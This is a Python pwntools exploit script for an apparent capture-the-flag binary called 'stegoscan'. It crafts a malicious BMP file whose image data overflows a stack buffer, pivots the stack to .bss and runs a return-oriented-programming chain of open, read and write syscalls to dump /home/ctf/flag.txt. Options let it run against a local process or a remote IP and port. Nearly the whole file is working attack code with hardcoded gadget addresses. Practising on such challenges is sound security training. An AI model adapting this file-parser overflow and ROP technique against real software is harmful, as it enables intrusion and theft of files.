#!/usr/bin/env python3
from pwn import *
import struct

# =========================================================
#                          SETUP                         
# =========================================================
exe = './challenge/stegoscan'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'http://103.226.139.23:1337', 1337
exploit_bmp = './exploit.bmp'

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + [exploit_bmp], gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + [exploit_bmp])

gdbscript = '''
init-pwndbg

# main's ret
break *0x401e2e
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# pwndbg> !file ./challenge/stegoscan
# ./challenge/stegoscan: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=984429b7f4d456663e5c4dbd7050a337e0530bbb, for GNU/Linux 3.2.0, not stripped
# └──╼ [★]$ pwn checksec challenge/stegoscan 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

# http://www.ue.eti.pg.gda.pl/fpgalab/zadania.spartan3/zad_vga_struktura_pliku_bmp_en.html

MIN_IMGSIZE = 400
MAX_IMGSIZE = 900

def build_bmp(signature=b'BM', fileSize=0, reserved=0, dataOffset=54,
              headerSize=40, width=30, height=30, colorPlanes=1,
              bitsPerPixel=24, compression=0, imageSize=500,
              horizontalResolution=2835, verticalResolution=2835,
              numColors=0, importantColors=0, RasterData=None):

    # challenge specific checks
    if imageSize < MIN_IMGSIZE:
        raise ValueError('Image size is too small')
    if imageSize > MAX_IMGSIZE:
        raise ValueError('Image size is too large')
    if width != height:
        raise ValueError('Only square images are supported')

    # Pack BMP header (14 bytes)
    bmp_header = struct.pack('<2sIHHI', signature, fileSize, reserved, reserved, dataOffset)

    # Pack DIB header (40 bytes)
    dib_header = struct.pack('<IIIHHIIIIII', headerSize, width, height, colorPlanes, bitsPerPixel,
                             compression, imageSize, horizontalResolution, verticalResolution,
                             numColors, importantColors)

    bmp_data = bmp_header + dib_header + RasterData
    return bmp_data

MOV_RDX_TO_PTR_RSI = 0x0000000000488cea
POP_RAX = 0x0000000000450847
POP_RDI = 0x000000000040253f
POP_RDX_RBX = 0x00000000004868eb
POP_RSI = 0x000000000040a5ae
SYSCALL =  0x00000000004022f4
RET = 0x000000000040101a

def mov(where, what):
    return flat([
        POP_RDX_RBX,
        what,
        0x0,
        POP_RSI,
        where,
        MOV_RDX_TO_PTR_RSI
    ])

def exploit():
    global io
    rop = ROP(elf)

    SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]

    pivot = elf.bss() + 0x200
    payload = cyclic(448) + p64(pivot) #+ cyclic(400) # can be 0 or 32 
    payload += flat({
        0: [
            p64(RET) * 10, # ret slep, some brute needed, just upload the same generated payload again
            mov(pivot, u64(b'/home/ctf/flag.txt'[0:8])),
            mov(pivot+8, u64(b'/home/ctf/flag.txt'[8:16])),
            mov(pivot+16, u64(b'xt'.ljust(8, b'\x00'))),

            POP_RDI,
            pivot,
            POP_RSI,
            0,
            POP_RDX_RBX,
            0,
            0,
            POP_RAX,
            2,
            SYSCALL,

            POP_RDI,
            3,
            POP_RSI,
            pivot,
            POP_RDX_RBX,
            0x40,
            0,
            POP_RAX,
            0,
            SYSCALL,

            POP_RDI,
            1,
            POP_RAX,
            1,
            SYSCALL            
        ]
    })

    with open(exploit_bmp, "wb") as f:
        f.write(build_bmp(
            width=20,
            height=20,
            imageSize=400,
            dataOffset=66,
            RasterData=payload
    ))

    io = initialize()

    log.success("pivot: %#x", pivot)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
